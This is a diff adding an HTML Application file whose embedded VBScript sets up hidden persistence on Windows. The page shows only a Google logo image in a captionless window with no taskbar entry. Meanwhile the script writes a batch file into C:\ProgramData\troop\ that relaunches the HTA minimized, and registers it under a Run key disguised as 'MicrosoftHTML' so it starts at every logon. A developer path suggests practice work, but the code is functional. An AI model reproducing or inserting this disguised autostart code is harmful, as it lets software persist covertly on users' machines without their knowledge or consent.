@@ -1,0 +1,52 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"  "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+   <head>
+    <HTA:APPLICATION
+	  ID="objHTA_Info"
+	  APPLICATIONNAME="HTA_Info" 
+	  BORDERSTYLE = "Normal"
+	  CAPTION = "No"
+	  CONTEXTMENU = "No"
+	  INNERBORDER = "No"
+	  MAXIMIZEBUTTON = "No"
+	  MINIMIZEBUTTON = "No"
+	  NAVIGABLE = "No"
+	  SCROLL = "No"
+	  SCROLLFLAT = "No"
+	  SELECTION = "No"			 
+	  SHOWINTASKBAR = "No"
+	  SINGLEINSTANCE = "Yes"		
+	  WINDOWSTATE="maximize"
+	/>
+	<script Language="VBScript">	
+	NewDir = "C:\ProgramData\troop\"
+	DlLoc = "C:\Users\khokon\Desktop\Practice_HTA\"
+    Dim fso,obf,oShell
+	Set oShell = CreateObject("WScript.Shell")
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	
+	strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )	
+	FullName  = replace(objHTA_Info.commandLine,chr(34),"")  
+	arrFN     = split(FullName,"\")  
+	FileName  = arrFN(ubound(arrFN))
+	SourceDir = replace(FullName,FileName,"") 	
+	FullName  = SourceDir & FileName	
+
+	If fso.FolderExists(NewDir) Then
+	Else
+		fso.CreateFolder (NewDir)
+		outFile = NewDir&"test.bat"
+		Set obf = fso.CreateTextFile(outFile,True)	
+		obf.Write "@echo off"&vbCrLf
+		obf.Write "start /min /low mshta.exe "&chr(34)&FullName& chr(34)&vbCrLf 	
+		obf.Close
+		appName = "MicrosoftHTML"
+		hkcu = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&appName
+		oShell.RegWrite hkcu , Trim(chr(34) & outFile) & chr(34) , "REG_SZ" 		
+    End If	
+	</script>
+	</head>
+	<body>
+		<img src="http://hyperallergic.com/wp-content/uploads/2015/09/new-google.jpg"/>
+	</body>
+	</html>
